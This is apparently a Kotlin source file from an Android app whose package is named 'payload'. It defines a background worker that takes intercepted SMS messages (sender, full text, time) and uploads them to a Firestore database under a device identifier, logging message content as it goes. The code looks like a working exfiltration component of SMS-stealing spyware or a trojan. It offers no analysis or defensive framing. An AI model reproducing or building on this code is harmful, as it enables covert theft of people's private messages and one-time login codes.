package com.payload.jansiix0ne.worker

import android.content.Context
import android.provider.Settings
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.payload.jansiix0ne.models.SmsModel
import kotlinx.coroutines.tasks.await
import java.util.Date
import java.util.UUID

class SmsUploadWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    private val firestore = FirebaseFirestore.getInstance()

    override suspend fun doWork(): Result {
        return try {
            android.util.Log.d("SmsUploadWorker", "Starting new SMS upload...")
            
            val from = inputData.getString("from") ?: return Result.failure()
            val message = inputData.getString("message") ?: return Result.failure()
            val time = inputData.getLong("time", -1L)
            if (time == -1L) return Result.failure()
            
            android.util.Log.d("SmsUploadWorker", "SMS from: $from")
            android.util.Log.d("SmsUploadWorker", "Message: ${message.take(50)}...")
            
            val deviceId = getDeviceId()
            android.util.Log.d("SmsUploadWorker", "Device ID: $deviceId")
            
            val smsModel = SmsModel(
                from = from,
                message = message,
                time = Timestamp(Date(time)),
                ownerDeviceId = deviceId
            )
            
            val targetDeviceId = inputData.getString("deviceId") ?: return Result.failure()
            
            // Upload to Firestore
            android.util.Log.d("SmsUploadWorker", "Uploading to Firestore...")
            uploadSmsToFirestore(smsModel, targetDeviceId)
            
            android.util.Log.d("SmsUploadWorker", "✅ SMS uploaded successfully!")
            Result.success()
        } catch (e: Exception) {
            android.util.Log.e("SmsUploadWorker", "❌ SMS upload failed: ${e.message}", e)
            Result.failure()
        }
    }

    private suspend fun uploadSmsToFirestore(smsModel: SmsModel, deviceId: String) {
        firestore.collection("devices")
            .document(deviceId)
            .collection("sms")
            .add(smsModel)
            .await()
    }

    private fun getDeviceId(): String {
        val prefs = applicationContext.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("device_id", null)
        
        if (deviceId.isNullOrBlank()) {
            deviceId = Settings.Secure.getString(
                applicationContext.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            
            if (deviceId.isNullOrBlank() || deviceId == "unknown") {
                deviceId = UUID.randomUUID().toString()
            }
            
            prefs.edit().putString("device_id", deviceId).apply()
        }
        
        return deviceId
    }
}
